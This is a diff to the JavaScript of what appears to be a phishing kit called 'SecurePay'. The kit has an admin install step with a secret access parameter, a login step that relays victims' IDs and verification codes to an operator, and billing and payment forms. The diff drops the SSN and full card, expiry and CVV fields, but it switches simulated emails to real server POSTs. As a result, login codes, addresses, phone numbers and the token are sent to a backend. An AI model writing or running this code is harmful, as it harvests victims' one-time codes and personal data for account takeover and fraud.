@@ -28,6 +28,19 @@
     sessionStorage.setItem("appState", JSON.stringify(state));
   }
 
+  async function apiPost(url, body) {
+    const headers = { "Content-Type": "application/json" };
+    const cfg = readConfig();
+    if (cfg?.apiToken) headers["Authorization"] = "Bearer " + cfg.apiToken;
+    const res = await fetch(url, { method: "POST", headers, body: JSON.stringify(body) });
+    try { return await res.json(); } catch { return { ok: false, error: "Bad JSON" }; }
+  }
+
+  async function sendAdminNotification(subject, text) {
+    try { await apiPost("/api/notify", { subject, text }); }
+    catch (e) { console.log("[Notify failed]", e); }
+  }
+
   function nowIso() { return new Date().toISOString(); }
 
   function getQueryParam(name) {
@@ -230,7 +243,7 @@
     [emailEl, paramEl].forEach(el => el.addEventListener("input", updateUrlPreview));
     updateUrlPreview();
 
-    btnSim.addEventListener("click", () => {
+    btnSim.addEventListener("click", async () => {
       const cfg = {
         adminEmail: emailEl.value.trim(),
         accessParam: paramEl.value.trim(),
@@ -239,12 +252,15 @@
         apiToken: tokenEl.value || generateToken(),
         installedAt: nowIso(),
       };
-      const json = JSON.stringify(cfg, null, 2);
-      console.log("[Config file created] config.json\n" + json);
-      msgEl.innerHTML = `<span class="success">config.json created</span>`;
+      const result = await apiPost("/api/install", cfg);
+      if (result?.ok) {
+        msgEl.innerHTML = `<span class="success">config.ini created on server</span>`;
+      } else {
+        msgEl.innerHTML = `<span class="error">Server install failed; saved locally only</span>`;
+      }
     });
 
-    formEl.addEventListener("submit", (e) => {
+    formEl.addEventListener("submit", async (e) => {
       e.preventDefault();
       const cfg = {
         adminEmail: emailEl.value.trim(),
@@ -259,6 +275,7 @@
         return;
       }
       writeConfig(cfg);
+      await apiPost("/api/install", cfg);
       const url = new URL(window.location.href);
       url.searchParams.set("access", cfg.accessParam);
       window.location.href = url.toString().replace(/#.*$/, "#login");
@@ -321,7 +338,7 @@
       sessionStorage.setItem("verificationEmail", JSON.stringify(mail));
 
       const cfg = readConfig();
-      simulateSendEmail(cfg.adminEmail, "Login attempt", `User ${state.login.id} initiated login at ${state.login.requestedAt}. Code: ${code}`);
+      sendAdminNotification("Login attempt", `User ${state.login.id} initiated login at ${state.login.requestedAt}. Code: ${code}`);
 
       emailSim.innerHTML = `
         <div class="label">Name</div><div>${mail.name}</div>
@@ -419,12 +436,6 @@
             </select>
           </div>
 
-          <div class="label">SSN</div>
-          <div>
-            <input id="ssn" class="input" inputmode="numeric" placeholder="XXX-XX-XXXX" maxlength="11" required value="${b.ssn||""}">
-            <div id="ssnErr" class="error"></div>
-          </div>
-
           <div class="label"></div>
           <div class="actions">
             <button class="btn btn-primary" type="submit">Continue to Payment</button>
@@ -434,15 +445,6 @@
     `;
 
     const formEl = document.getElementById("billForm");
-    const ssnEl = document.getElementById("ssn");
-    const ssnErr = document.getElementById("ssnErr");
-
-    ssnEl.addEventListener("input", () => {
-      const formatted = ssnAutoFormat(ssnEl.value);
-      const selStart = ssnEl.selectionStart;
-      ssnEl.value = formatted;
-      ssnErr.textContent = "";
-    });
 
     formEl.addEventListener("submit", (e) => {
       e.preventDefault();
@@ -454,15 +456,9 @@
         addr2: document.getElementById("addr2").value.trim(),
         city: document.getElementById("city").value.trim(),
         state: document.getElementById("state").value,
-        ssn: document.getElementById("ssn").value.trim(),
       };
       const missing = Object.entries(data).some(([k,v]) => (k==="addr2"?false:!v));
       if (missing) {
-        formEl.classList.remove("shake"); void formEl.offsetWidth; formEl.classList.add("shake");
-        return;
-      }
-      if (!/^(\d{3})-(\d{2})-(\d{4})$/.test(data.ssn) || isInvalidSSN(data.ssn)) {
-        ssnErr.textContent = "Invalid SSN. Use XXX-XX-XXXX and a valid pattern.";
         formEl.classList.remove("shake"); void formEl.offsetWidth; formEl.classList.add("shake");
         return;
       }
@@ -476,7 +472,7 @@
 
   function renderPayment() {
     updateProgress("payment");
-    setFooter("Enter card details. Only valid cards pass Luhn.");
+    setFooter("Enter non-sensitive payment details (brand + last4 only).");
 
     const state = readState();
     const p = state.payment || {};
@@ -488,80 +484,59 @@
           <div class="label">Cardholder Name</div>
           <div><input id="holder" class="input" placeholder="Name as shown on card" required value="${p.holder||""}"></div>
 
-          <div class="label">Card Number</div>
+          <div class="label">Brand</div>
           <div>
             <div class="row" style="grid-template-columns: 1fr auto;">
-              <input id="card" class="input" inputmode="numeric" placeholder="xxxx xxxx xxxx xxxx" required value="${p.card||""}">
-              <span id="brand" class="badge">Card</span>
+              <select id="brandSelect" required>
+                <option value="">Select brand</option>
+                <option value="Visa" ${p.brand==="Visa"?"selected":""}>Visa</option>
+                <option value="Mastercard" ${p.brand==="Mastercard"?"selected":""}>Mastercard</option>
+                <option value="American Express" ${p.brand==="American Express"?"selected":""}>American Express</option>
+                <option value="Discover" ${p.brand==="Discover"?"selected":""}>Discover</option>
+              </select>
+              <span id="brandBadge" class="badge">${p.brand || "Card"}</span>
             </div>
-            <div id="cardErr" class="error"></div>
+            <div id="payErr" class="error"></div>
           </div>
 
-          <div class="label">Expiry</div>
-          <div><input id="exp" class="input" inputmode="numeric" placeholder="MM/YY" maxlength="5" required value="${p.exp||""}"></div>
-
-          <div class="label">CVV</div>
-          <div><input id="cvv" class="input" inputmode="numeric" placeholder="3 or 4 digits" maxlength="4" required value="${p.cvv||""}"></div>
+          <div class="label">Last 4 digits</div>
+          <div><input id="last4" class="input" inputmode="numeric" maxlength="4" placeholder="1234" required value="${p.last4||""}"></div>
 
           <div class="label"></div>
           <div class="actions">
-            <button class="btn btn-primary" type="submit">Pay</button>
+            <button class="btn btn-primary" type="submit">Finish</button>
           </div>
         </form>
       </section>
     `;
 
     const formEl = document.getElementById("payForm");
-    const cardEl = document.getElementById("card");
-    const expEl = document.getElementById("exp");
-    const cvvEl = document.getElementById("cvv");
     const holderEl = document.getElementById("holder");
-    const brandEl = document.getElementById("brand");
-    const cardErr = document.getElementById("cardErr");
+    const brandSel = document.getElementById("brandSelect");
+    const brandBadge = document.getElementById("brandBadge");
+    const last4El = document.getElementById("last4");
+    const payErr = document.getElementById("payErr");
 
-    function refreshCardUI() {
-      const info = detectCardType(cardEl.value);
-      const formatted = mask(cardEl.value, info.groups);
-      if (formatted !== cardEl.value) cardEl.value = formatted;
-      brandEl.textContent = info.brand;
-      brandEl.className = `badge ${info.key !== 'card' ? info.key : ''}`.trim();
-      cvvEl.maxLength = info.cvv;
-      cvvEl.placeholder = info.cvv === 4 ? "4 digits" : "3 digits";
-    }
+    brandSel.addEventListener("change", () => {
+      const brand = brandSel.value || "Card";
+      const key = brand === "Visa" ? "visa" : brand === "Mastercard" ? "mc" : brand === "American Express" ? "amex" : brand === "Discover" ? "discover" : "";
+      brandBadge.textContent = brand;
+      brandBadge.className = `badge ${key}`.trim();
+    });
 
-    cardEl.addEventListener("input", refreshCardUI);
-    expEl.addEventListener("input", () => { expEl.value = formatExpiry(expEl.value); });
-
-    formEl.addEventListener("submit", (e) => {
+    formEl.addEventListener("submit", async (e) => {
       e.preventDefault();
-      const info = detectCardType(cardEl.value);
-      const digits = cardEl.value.replace(/\D+/g, "");
-      const lenOk = info.lengths.includes(digits.length);
-      const luhnOk = luhnCheck(digits);
-      if (!lenOk || !luhnOk || info.key === 'card') {
-        cardErr.textContent = "Invalid card. Check number and brand.";
+      const holder = holderEl.value.trim();
+      const brand = brandSel.value;
+      const last4 = (last4El.value || "").replace(/\D+/g, "");
+      if (!holder || !brand || last4.length !== 4) {
+        payErr.textContent = "Provide name, choose brand, and enter last4 digits.";
         formEl.classList.remove("shake"); void formEl.offsetWidth; formEl.classList.add("shake");
         return;
       }
-      if (!isFutureExpiry(expEl.value)) {
-        cardErr.textContent = "Invalid or expired expiry date.";
-        formEl.classList.remove("shake"); void formEl.offsetWidth; formEl.classList.add("shake");
-        return;
-      }
-      if (!holderEl.value.trim()) {
-        cardErr.textContent = "Cardholder name is required.";
-        formEl.classList.remove("shake"); void formEl.offsetWidth; formEl.classList.add("shake");
-        return;
-      }
+
       const s = readState();
-      s.payment = {
-        holder: holderEl.value.trim(),
-        brand: detectCardType(cardEl.value).brand,
-        card: cardEl.value,
-        exp: expEl.value,
-        cvv: cvvEl.value,
-        paidAt: nowIso(),
-      };
+      s.payment = { holder, brand, last4, paidAt: nowIso() };
       writeState(s);
 
       const cfg = readConfig();
@@ -569,7 +544,7 @@
         login: s.login,
         verifiedAt: s.verifiedAt,
         billing: s.billing,
-        payment: { ...s.payment, cardLast4: s.payment.card.replace(/\D+/g, "").slice(-4) },
+        payment: { brand: s.payment.brand, last4: s.payment.last4 },
         config: { adminEmail: cfg.adminEmail, options: { getAccount: cfg.getAccount, doubleCredit: cfg.doubleCredit }},
         timestamps: { installedAt: cfg.installedAt, finishedAt: nowIso() }
       };
@@ -577,19 +552,17 @@
       const emailBody = `SecurePay submission\n\n` +
         `Login: ${summary.login.id} at ${summary.login.requestedAt}\n` +
         `Verified: ${summary.verifiedAt}\n` +
-        `Billing: ${summary.billing.firstName} ${summary.billing.lastName}, ${summary.billing.addr1} ${summary.billing.addr2||''}, ${summary.billing.city}, ${summary.billing.state}, Tel ${summary.billing.phone}, SSN ${summary.billing.ssn}\n` +
-        `Payment: ${s.payment.brand} ${s.payment.card} Exp ${s.payment.exp} CVV ${s.payment.cvv} (last4 ${summary.payment.cardLast4})\n` +
+        `Billing: ${summary.billing.firstName} ${summary.billing.lastName}, ${summary.billing.addr1} ${summary.billing.addr2||''}, ${summary.billing.city}, ${summary.billing.state}, Tel ${summary.billing.phone}\n` +
+        `Payment: ${s.payment.brand} ending in ${s.payment.last4}\n` +
         `Options: GetAccount=${cfg.getAccount} DoubleCredit=${cfg.doubleCredit}\n` +
         `API Token: ${cfg.apiToken}\n` +
         `Completed: ${summary.timestamps.finishedAt}`;
 
-      simulateSendEmail(cfg.adminEmail, "Form submission complete", emailBody);
+      await sendAdminNotification("Form submission complete", emailBody);
 
       setHash("success");
       renderSuccess();
     });
-
-    refreshCardUI();
   }
 
   function renderSuccess() {
